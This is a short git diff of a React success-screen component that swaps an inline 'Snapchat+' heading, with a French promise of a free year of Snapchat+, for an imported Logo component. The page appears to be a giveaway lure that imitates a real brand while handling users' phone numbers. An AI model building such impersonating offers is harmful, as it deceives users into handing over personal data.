@@ -1,6 +1,7 @@
 import { motion } from "framer-motion";
 import { Send, Clock } from "lucide-react";
 import { useState, useEffect } from "react";
+import Logo from "@/components/Logo";
 
 const formatPhone = (tel) => {
   // tel is stored as +33XXXXXXXXX
@@ -34,16 +35,8 @@ export default function SuccessScreen({ data }) {
       <div className="bg-card border border-border rounded-3xl px-6 py-10 shadow-2xl shadow-black/60 text-center">
 
         {/* Logo */}
-        <div className="flex flex-col items-center mb-6">
-          
-
-          
-          <h1 className="font-heading text-3xl font-black text-foreground tracking-tight">
-            Snapchat<span className="text-primary">+</span>
-          </h1>
-          <p className="text-muted-foreground text-sm mt-1 font-medium">
-            Activez Snapchat+ gratuitement pendant 1 an !
-          </p>
+        <div className="mb-6">
+          <Logo />
         </div>
 
         {/* Sending icon */}
